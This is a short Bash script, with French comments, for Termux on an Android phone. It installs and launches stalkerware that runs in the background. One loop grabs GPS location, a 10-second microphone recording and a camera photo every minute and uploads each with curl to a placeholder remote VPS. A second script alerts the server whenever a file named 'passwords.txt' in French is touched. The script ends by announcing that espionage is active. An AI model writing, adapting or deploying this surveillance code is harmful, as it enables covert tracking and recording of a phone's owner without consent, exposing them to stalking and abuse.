#!/bin/bash

SERVER="http://<IP_VPS>:8080"

echo "[+] Mise à jour et installation des outils..."
pkg update && pkg install termux-api curl inotify-tools -y

echo "[+] Création des scripts..."

# Script de surveillance `spy.sh`
cat << EOF > /data/data/com.termux/files/home/spy.sh
#!/bin/bash
while true; do
    location=\$(termux-location)
    curl -X POST -d "\$location" "$SERVER/gps"

    termux-microphone-record -d 10 /sdcard/audio.wav
    curl -F "file=@/sdcard/audio.wav" "$SERVER/upload"

    termux-camera-photo -c 1 /sdcard/photo.jpg
    curl -F "file=@/sdcard/photo.jpg" "$SERVER/upload"

    sleep 60
done
EOF

# Script d’alerte `alert.sh`
cat << EOF > /data/data/com.termux/files/home/alert.sh
#!/bin/bash
inotifywait -m /sdcard/mots_de_passe.txt | while read; do
    curl -X POST "$SERVER/alert"
done
EOF

echo "[+] Activation des scripts..."
chmod +x /data/data/com.termux/files/home/spy.sh
chmod +x /data/data/com.termux/files/home/alert.sh

nohup bash /data/data/com.termux/files/home/spy.sh &
nohup bash /data/data/com.termux/files/home/alert.sh &

echo "[+] Espionnage activé !"
